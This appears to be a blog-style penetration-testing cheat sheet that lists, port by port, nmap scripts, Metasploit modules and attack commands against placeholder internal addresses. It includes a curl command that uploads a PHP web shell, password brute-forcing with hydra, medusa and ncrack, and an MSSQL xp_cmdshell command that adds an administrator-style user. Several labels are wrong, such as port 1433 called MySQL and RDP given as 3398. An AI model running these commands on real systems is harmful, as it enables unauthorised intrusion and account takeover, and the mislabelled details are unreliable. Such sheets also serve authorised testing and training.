---
title: Ports 
date: 2022-12-04 16:35:00 +00:00
categories: [ports]
tags: [ports]     # TAG names should always be lowercase
---

# Common Ports And Usage


- [Port 21](#port-21-ftp)
 - [Port 22 (SSH)](#port-22-ssh)
 - [Port 25 (SMTP)](#port-25-smtp)
 - [Port 80 (web)](#port-80-web)
 - [Port 135 (Microsoft RPC)](#port-135-microsoft-rpc)
 - [Port 139/445 (SMB)](#port-139445-smb)
 - [Port 161 (SNMP Enum)](#port-161-snmp-enum)
 - [Port 161/162 (UDP)](#port-161162-udp)
 - [Port 443 (Https)](#port-443-https)
 - [Port 1433 (MySQL)](#port-1433-mysql)
 - [Port 1521 (Oracle DB)](#port-1521-oracle-db)
 - [Port 3306 (MySQL)](#port-3306-mysql)
 - [Port 3398 (RDP)](#port-3398-rdp)
 
 
 
## Port 21 (FTP)
```
nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.0
```
**Metasploit Modules FTP**
- auxiliary/scanner/ftp/anonymous
- auxiliary/scanner/ftp/ftp_login
- auxiliary/scanner/ftp/ftp_version
- auxiliary/scanner/ftp/konica_ftp_traversal


## Port 22 (SSH)

Nmap
```
nmap -p 22 -n -v -sV -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10
nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10 
nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt 192.168.1.10
```
**Metasploit Modules for SSH service**
- auxiliary/scanner/ssh/fortinet_backdoor
- auxiliary/scanner/ssh/juniper_backdoor
- auxiliary/scanner/ssh/ssh_enumusers
- auxiliary/scanner/ssh/ssh_identify_pubkeys
- auxiliary/scanner/ssh/ssh_login
- auxiliary/scanner/ssh/ssh_login_pubkey
- auxiliary/scanner/ssh/ssh_version


## Port 25 (SMTP)
```
nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1
```
```
nc -nvv INSERTIPADDRESS 25
```
```
telnet INSERTIPADDRESS 25
```
**Metasploit Modules for SMTP service**
- auxiliary/scanner/smtp/smtp_enum
- auxiliary/scanner/smtp/smtp_ntlm_domain
- auxiliary/scanner/smtp/smtp_relay
- auxiliary/scanner/smtp/smtp_version 


## Port 80 (Web)
```
nikto -h http://192.168.1.10/
curl -v -X PUT -d '<?php shell_exec($_GET["cmd"]); ?>' http://192.168.1.10/shell.php
sqlmap -u http://192.168.1.10/ --crawl=5 --dbms=mysql
cewl http://192.168.1.10/ -m 6 -w special_wordlist.txt
medusa -h 192.168.1.10 -u admin -P  wordlist.txt -M http -m DIR:/admin -T 10
nmap -p 80 -n -v -sV -Pn --script http-backup-finder,http-config-backup,http-errors,http-headers,http-iis-webdav-vuln,http-internal-ip-disclosure,http-methods,http-php-version,http-qnap-nas-info,http-robots.txt,http-shellshock,http-slowloris-check,http-waf-detect,http-vuln* 192.168.1.10

```
- Sql Injection
- XXS Injection
- Blind  Injection


## Port 135 (Microsoft RPC)
```
nmap -n -v -sV -Pn -p 135 --script=msrpc-enum 192.168.1.10 
```
**Metasploit Exploit Module for Microsoft RPC service**
- exploit/windows/dcerpc/ms05_017_msmq


## Port 139/445 (SMB)
```
nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smbv2-enabled,smbv2-enabled,smb-vuln* 192.168.1.10
nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse
enum4linux -a 192.168.1.10
rpcclient -U "" 192.168.1.10
 >srvinfo
 >enumdomusers
 >getdompwinfo
smbclient -L 192.168.1.10
smbclient \\192.168.1.10\ipc$ -U administrator
smbclient //192.168.1.10/ipc$ -U administrator
smbclient //192.168.1.10/admin$ -U administrator
enum4linux –a 10.0.0.1
nbtscan x.x.x.x // Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
py 192.168.XXX.XXX 500 50000 dict.txt
python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX
```
Note: Test with -U '' -P '' (for null credentials)


## Port 161 (SNMP Enum)
```
snmpwalk -c public -v1 10.0.0.0
snmpcheck -t 192.168.1.X -c public
onesixtyone -c names -i hosts
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX
nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt
snmpenum -t 192.168.1.X
```

## Port 161/162 (UDP)
```
nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat 192.168.1.10
onesixtyone -c communities.txt 192.168.1.10
snmp-check -t 192.168.1.10 -c public
snmpwalk -c public -v 1 192.168.1.10 [MIB_TREE_VALUE]
hydra -P passwords.txt -v 192.168.1.10 snmp

#Communities.txt
public
private
community

#SNMP MIB Trees
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```
**Metasploit Modules for SNMP service**
- auxiliary/scanner/snmp/snmp_enum
- auxiliary/scanner/snmp/snmp_enum_hp_laserjet
- auxiliary/scanner/snmp/snmp_enumshares
- auxiliary/scanner/snmp/snmp_enumusers
- auxiliary/scanner/snmp/snmp_login


## Port 443 (Https)
```
sslscan https://192.168.1.10/
```
**Metasploit Modules for Microsoft SMB service**
- auxiliary/scanner/smb/psexec_loggedin_users
- auxiliary/scanner/smb/smb_enumshares
- auxiliary/scanner/smb/smb_enumusers
- auxiliary/scanner/smb/smb_enumusers_domain
- auxiliary/scanner/smb/smb_login
- auxiliary- /scanner/smb/smb_lookupsid
- auxiliary/scanner/smb/smb_ms17_010
- auxiliary/scanner/smb/smb_version


## Port 1433 (MySQL)
```
nmap -n -v -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.10
nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password  192.168.1.10
nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user lifeoverpentest MySecretPassword123 /add" 192.168.1.10
sqsh -S 192.168.1.10 -U sa
```

**Metasploit Modules for MsSQL service**
- auxiliary/scanner/mssql/mssql_login
- auxiliary/admin/mssql/mssql_exec
- auxiliary/admin/mssql/mssql_enum


## Port 1521 (Oracle DB)
```
nmap -n -v -sV -Pn -p 1521 --script=oracle-enum-users --script-args sid=ORCL,userdb=users.txt 192.168.1.10
nmap -n -v -sV -Pn -p 1521 --script=oracle-sid-brute 192.168.1.10
tnscmd10g version -h 192.168.1.10
tnscmd10g status -h 192.168.1.10
```

**Metasploit Modules for Oracle DB service** 
- auxiliary/scanner/oracle/emc_sid
- auxiliary/scanner/oracle/oracle_login 
- auxiliary/scanner/oracle/sid_brute
- auxiliary/scanner/oracle/sid_enum
- auxiliary/scanner/oracle/tnslsnr_version
- auxiliary/scanner/oracle/tnspoison_checker


## Port 3306 (MySQL)
```
nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.10
mysql --host=192.168.1.10 -u root -p
```

**Metasploit Modules for MySQL service**
- auxiliary/scanner/mysql/mysql_authbypass_hashdump
- auxiliary/scanner/mysql/mysql_login
- auxiliary/scanner/mysql/mysql_schemadump
- auxiliary/scanner/mysql/mysql_version
- auxiliary/scanner/mysql/mysql_writable_dirs


## Port 3398 (RDP)
```
ncrack -vv --user administrator -P passwords.txt rdp://192.168.1.10,CL=1
rdesktop 192.168.1.10
```

**Metasploit Modules for Remote Desktop service**
- auxiliary/scanner/rdp/ms12_020_check
- auxiliary/scanner/rdp/rdp_scanner 


